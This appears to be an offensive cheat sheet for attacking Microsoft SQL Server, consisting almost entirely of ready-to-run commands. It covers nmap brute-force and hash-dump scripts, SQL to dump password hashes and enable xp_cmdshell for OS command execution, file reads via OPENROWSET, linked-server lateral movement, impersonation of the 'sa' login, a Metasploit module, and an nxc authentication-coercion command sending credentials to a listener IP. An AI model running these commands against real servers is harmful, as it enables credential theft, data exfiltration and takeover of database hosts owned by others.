```
SELECT @@version;
SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel'), SERVERPROPERTY('edition');
```

## Nmap Scan

```bash
# Version
nmap -p 1433 --script ms-sql-info <target>

# Enumeration
nmap -p 1433 --script ms-sql-* <target>

# Users and Passwords
nmap -p 1433 --script ms-sql-hasdbaccess,ms-sql-empty-password <target>

# Verilənlər bazası / cədvəl siyahısı
nmap -p 1433 --script ms-sql-databases,ms-sql-tables <target>

# Brute force
nmap -p 1433 --script ms-sql-brute \
  --script-args mssqluserdb=users.txt,mssqlpassdb=pass.txt <target>

# xp_cmdshell 
nmap -p 1433 --script ms-sql-xp-cmdshell <target>

# Hash dump 
nmap -p 1433 --script ms-sql-dump-hashes \
  --script-args mssqlusername='sa',mssqlpassword='pass' <target>

# Backup Configuration
nmap -p 1433 --script ms-sql-config <target> \
  --script-args mssqlusername='sa',mssqlpassword='pass'
```

## Current user & privileges
```
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM sys.server_principals;
SELECT name, type_desc, is_disabled FROM sys.server_principals ORDER BY name;
```

## List databases
```
SELECT name FROM sys.databases;
```

## List tables in a database
```
USE <database>;
SELECT table_name FROM information_schema.tables;
```

## List columns of a table
```
SELECT column_name FROM information_schema.columns WHERE table_name = '<table>';
```

## Dump data
```
SELECT id, username, password_hash, email FROM <table>;
```

## Linked servers (lateral movement potential)
```
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
EXEC sp_helplinkedsrvlogin;
```

## Query a linked server:
```
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@version');
```

## Enable and use xp_cmdshell
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## MSSQL Coerce
```
nxc mssql 10.129.35.223 -u 'PublicUser' -p 'GuestUserCantWrite1' --local-auth -M mssql_coerce -o LISTENER=10.10.17.6
```

## Critical Files
```
C:\sqlserver\Logs\ERRORLOG.bak
```

## Read files
```
SELECT * FROM OPENROWSET(BULK 'C:\path\to\file.txt', SINGLE_CLOB) AS Contents;
```

## Write files (via xp_cmdshell, if enabled)
```
EXEC xp_cmdshell 'echo test > C:\temp\test.txt';
```

## Impersonation abuse:
```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
```

## MSFCONSOLE
```
msf6 > use auxiliary/admin/mssql/mssql_enum_domain_accounts
```
